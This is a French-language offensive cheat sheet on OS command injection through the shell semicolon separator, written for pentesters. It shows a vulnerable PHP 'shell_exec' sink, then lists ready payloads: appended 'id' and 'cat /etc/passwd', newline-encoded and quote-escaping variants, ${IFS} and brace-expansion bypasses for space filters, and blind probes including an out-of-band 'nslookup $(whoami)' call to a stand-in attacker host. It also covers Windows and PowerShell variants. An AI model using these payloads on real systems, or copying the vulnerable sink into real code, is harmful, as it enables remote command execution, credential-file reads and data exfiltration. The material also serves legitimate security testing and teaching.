---
title: "Chaînage séquentiel de commandes avec le séparateur point-virgule"
description: "Utiliser ; pour ajouter des commandes qui s'exécutent inconditionnellement après qu'une valeur injectée atteint un shell, la primitive d'injection de commande OS la plus simple."
keywords:
  - injection de commande
  - chaînage de commandes
  - séparateur point-virgule
  - exécution séquentielle
  - injection de shell
  - RCE
---

# Exécution séquentielle (;)

Le point-virgule est le séparateur de commandes simple du shell. Dans `sh`/`bash`, `a; b` exécute `a`, attend qu'il se termine, puis exécute `b`, **que `a` ait réussi ou échoué**. Lorsqu'une valeur utilisateur est concaténée dans une commande qu'un shell interprète, un seul `;` vous permet de terminer la commande prévue et d'y ajouter la vôtre.

## Mécanisme

Un sink typique concatène l'entrée dans une commande shell :

```php
// host comes from an HTTP parameter
$out = shell_exec("ping -c 1 " . $host);
```

Avec `host = 127.0.0.1; id`, le shell voit deux instructions et exécute les deux :

```
ping -c 1 127.0.0.1
id
```

La commande injectée s'exécute sous le compte de service de l'application. Contrairement à `&&`/`||`, le point-virgule ne porte **aucune condition** : votre commande se déclenche même quand la précédente échoue, ce qui en fait le séparateur le plus fiable pour une première sonde lorsque vous ne savez pas si la commande prévue se terminera.

## Payloads

Ajout basique, contexte reflété :

```
127.0.0.1; id
127.0.0.1; whoami
; cat /etc/passwd
```

Commencez par votre propre terminateur lorsque la valeur attendue peut encore s'exécuter et polluer la sortie, et ajoutez un `;` final pour avaler ce que l'application ajoute après votre entrée :

```
; id ;
foo; id #        # comment out the tail on POSIX sh
```

Un saut de ligne est aussi un séparateur d'instructions à l'intérieur de `sh -c`, donc un `%0a` URL-encodé se substitue à `;` lorsque le caractère littéral est retiré :

```
127.0.0.1%0aid
```

## Gestion du contexte

Le point-virgule ne fonctionne que là où il est analysé comme syntaxe. À l'intérieur de guillemets, vous devez d'abord en sortir :

```
# double quotes:  ping -c 1 "$host"
"; id; echo "
# single quotes:  sh -c 'ping ... '$host''
'; id; '
```

Lorsque les espaces sont filtrés, associez `;` à `${IFS}` ou à l'expansion d'accolades pour que la commande ajoutée se tokenise tout de même :

```
127.0.0.1;cat${IFS}/etc/passwd
127.0.0.1;{cat,/etc/passwd}
```

## Usage aveugle

Si la sortie n'est pas reflétée, le point-virgule délivre tout de même un payload dont vous observez l'effet hors bande, un délai, un contact DNS, ou un fichier écrit vers un chemin servi :

```
127.0.0.1; sleep 10
127.0.0.1; nslookup $(whoami).OOB_ID.attacker.example
```

## Note de plateforme

Sous `cmd.exe` de Windows, le point-virgule n'est **pas** un séparateur de commandes, utilisez `&` à la place (`127.0.0.1 & whoami`). En PowerShell, `;` sépare bien les instructions, donc un hôte qui lance PowerShell accepte `127.0.0.1; whoami`.

## Outils

- **[commix](https://github.com/commixproject/commix)** : exploitation automatisée de l'injection de commande.
- **[Burp Suite](https://portswigger.net/burp)** : Repeater et Intruder pour l'injection de séparateurs.

## Références

- [OWASP: OS Command Injection](https://owasp.org/www-community/attacks/Command_Injection)
- [PortSwigger Web Security Academy: OS command injection](https://portswigger.net/web-security/os-command-injection)
- [PayloadsAllTheThings: Command Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection)
